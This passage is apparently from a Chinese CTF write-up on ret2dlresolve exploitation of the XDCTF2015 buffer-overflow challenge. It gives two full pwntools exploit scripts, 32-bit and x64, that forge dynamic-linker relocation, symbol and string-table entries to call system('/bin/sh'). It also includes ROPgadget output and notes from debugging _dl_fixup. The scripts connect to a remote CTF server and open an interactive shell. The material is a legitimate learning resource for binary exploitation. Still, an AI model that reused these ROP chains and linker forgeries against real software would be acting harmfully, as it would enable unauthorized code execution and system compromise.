    if(len(sys.argv) < 2):
        print("Usage:")
        print("\tpython3 exploit [elf] [l r]")
        exit(0)
    if(sys.argv[2]=='l'):
        p = process('./'+sys.argv[1])
        elf = ELF('./'+sys.argv[1])
        libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    else:
        p = remote('node4.buuoj.cn','25733')
        elf = ELF('./'+sys.argv[1])
        #libc = ELF('./')
    sl = lambda x:p.sendline(x)
    sd = lambda x:p.send(x)
    sda = lambda x,y:p.sendafter(x,y)
    sla = lambda x,y:p.sendlineafter(x,y)
    rv = lambda x:p.recv(x)
    ru = lambda x:p.recvuntil(x)
    ia = lambda :p.interactive()
    debug = lambda x:print("[+] "+str(x))
    ru7f =  lambda : u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))
    ruf7 = lambda : u64(ru(b'\xf7')[-3:].ljust(4,b'\x00'))
    def pwn():
        read = elf.plt['read']
        write = elf.plt['write']
        bss = elf.bss() + 0x800
        pop_esi_edi_ebp_ret = 0x08048619
        leave_ret = 0x08048458
        pop_ebp_ret = 0x0804861b
        #gdb.attach(p,"b *0x08048519")
        payload = b'A' * 112 + p32(read) + p32(pop_esi_edi_ebp_ret) + p32(0) + p32(bss) + p32(0x80)
        payload+= p32(pop_ebp_ret) + p32(bss) + p32(leave_ret)
        sda("XDCTF2015~!\n",payload)
        #sleep(2)
        plt_0 = 0x08048380
        write_rinfo = 0x0000607
        rel_plt = 0x8048330
        index_offset = bss + 0x30 - rel_plt
        write_got = elf.got['write']
        dynsym = 0x80481D8
        dynstr = 0x8048278
        fake_sym_address = bss + 0x60
        align = 0x10 - ((fake_sym_address - dynsym) & 0xf)
        fake_sym_address = fake_sym_address + align
        write_rinfo = int((fake_sym_address - dynsym) / 0x10)
        write_rinfo = (write_rinfo << 8) | 0x7
        st_name = (bss + 0x50 + 0x8) - dynstr
        payload = b'BBBB'
        payload+= p32(plt_0) + p32(index_offset) + p32(0) + p32(bss+0x50)
        payload = payload.ljust(0x30,b'\x00') + p32(write_got) + p32(write_rinfo)
        #payload+= p32(write) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
        payload = payload.ljust(0x50,b'\x00') + b'/bin/sh\x00' + b'system\x00'
        payload = payload.ljust(0x60,b'\x00') + b'B' * align + p32(st_name) + p32(0) + p32(0) + p32(0x12)
        payload = payload.ljust(0x80,b'\x00')
        sd(payload)
    if __name__ == "__main__":
        pwn()
        ia()
# x64-利用-1
x64的利用更加简单，因为是寄存器传参，不存在栈迁移的问题，同样还是用bof的代码。
    root@16-223:/pwn/ret2dlresolve# ROPgadget --binary bof_x64_no --only 'pop|ret'
    Gadgets information
    ============================================================
    0x000000000040076c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040076e : pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000400770 : pop r14 ; pop r15 ; ret
    0x0000000000400772 : pop r15 ; ret
    0x000000000040076b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040076f : pop rbp ; pop r14 ; pop r15 ; ret
    0x00000000004005a0 : pop rbp ; ret
    0x0000000000400773 : pop rdi ; ret
    0x0000000000400771 : pop rsi ; pop r15 ; ret
    0x000000000040076d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    0x00000000004004c9 : ret
    0x00000000004006ba : ret 0x4804
    0x00000000004006e0 : ret 0x8d48
    Unique gadgets found: 13
一样的思路，rop构造第一此read将sh字符串以及fake_dynstr写到bss上，第二次read将fake_dynstr的地址写进.dynamic中存档dynstr地址的地方，第三次调用plt_0(即dl_fixup)。
说明一下为什么调用dl_fixup，因为所有函数都已调用过，只能重新调用dl_fixup来触发。
    from pwn import *
    from LibcSearcher import *
    context.terminal = ["tmux","splitw","-h"]
    context(arch='amd64',os='linux',log_level='debug')
    if(len(sys.argv) < 2):
        print("Usage:")
        print("\tpython3 exploit [elf] [l r]")
        exit(0)
    if(sys.argv[2]=='l'):
        p = process('./'+sys.argv[1])
        elf = ELF('./'+sys.argv[1])
        libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    else:
        p = remote('node4.buuoj.cn','25733')
        elf = ELF('./'+sys.argv[1])
        #libc = ELF('./')
    sl = lambda x:p.sendline(x)
    sd = lambda x:p.send(x)
    sda = lambda x,y:p.sendafter(x,y)
    sla = lambda x,y:p.sendlineafter(x,y)
    rv = lambda x:p.recv(x)
    ru = lambda x:p.recvuntil(x)
    ia = lambda :p.interactive()
    debug = lambda x:print("[+] "+str(x))
    ru7f =  lambda : u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))
    ruf7 = lambda : u64(ru(b'\xf7')[-3:].ljust(4,b'\x00'))
    def pwn():
        read = elf.plt['read']
        strlen = elf.plt['strlen']
        pop_rdi_ret = 0x0000000000400773
        pop_rsi_r15_ret = 0x0000000000400771
        plt_0 = 0x00000000004004d0
        bss = elf.bss() + 0x200
        dynstr_address = 0x600980 + 0x8
        fake_dynstr = b"\x00libc.so.6\x00stdin\x00system\x00"
        fake_dynstr_address = bss + 0x10
        payload = b'A' * 120
        payload+= p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss) + p64(0) + p64(read)
        payload+= p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(dynstr_address) + p64(0) + p64(read)
        payload+= p64(pop_rdi_ret) + p64(bss) + p64(plt_0) + p64(1)
        sla("Welcome to XDCTF2015~!\n",payload)
        sleep(1)
        payload = b'/bin/sh\x00'.ljust(0x10,b'\x00') + fake_dynstr
        sl(payload)
        #gdb.attach(p)
        sleep(1)
        payload = p64(fake_dynstr_address)
        sl(payload)
        #gdb.attach(p)
    if __name__ == "__main__":
        pwn()
        ia()
这里有必要说明一下为什么plt_0后面跟了个1，实际调试下来发现是作为_dl_fixup()的第二个参数:
最终刚好就是system字符串:
与我们伪造的dynstr有关。
这里有两个疑问:
  1. 为什么不通过寄存器直接传参(大概率是因为在调用dl_fixup前还有很多操作)。
  2. 为什么是1？  
以上两个问题经过调试都没有找到答案。
经过思考，既然作为dl_fixup的第二个参数，那么这个应该是reloc_arg:
可以看到strlen确实为1。
只能根据上面这个图，看到调用dl_fixup前，把rbx+0x10位置的值给了rsi，作为reloc_arg，所以只能调试来看可控的话就在rbx+0x10的位置放上1。